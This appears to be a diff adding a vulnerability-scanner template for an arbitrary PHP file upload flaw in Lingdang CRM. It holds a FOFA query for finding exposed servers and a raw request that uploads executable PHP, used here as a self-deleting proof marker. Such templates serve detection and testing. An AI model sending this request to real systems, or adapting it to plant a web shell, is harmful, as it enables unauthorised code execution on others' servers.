@@ -1,0 +1,43 @@
+id: ldcrm-uploadfile
+
+info:
+  name: Lingdang CRM uploadfile - File Upload
+  author: qwtd
+  severity: critical
+  description: |
+    灵当CRM系统接口uploadfile文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。
+  reference:
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E7%81%B5%E5%BD%93CRM/%E7%81%B5%E5%BD%93CRM%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3uploadfile%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  classification: 
+    cwe-id: CWE-434
+  metadata:
+    max-request: 1
+    fofa-query: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
+    verified: true
+  tags: 灵当CRM
+
+http:
+  - raw:
+      - |
+        POST /crm/weixinmp/index.php?userid=123&module=Upload&usid=1&action=uploadfile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        file_info={"name":"{{randstr_1}}.php"}&<?php echo md5({{num}});unlink(__FILE__);?>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "filename\":"
+          - "filepath\":"
+          - "filesuffixes\":"
+        condition: and
+
+      - type: status
+        status:
+          - 200
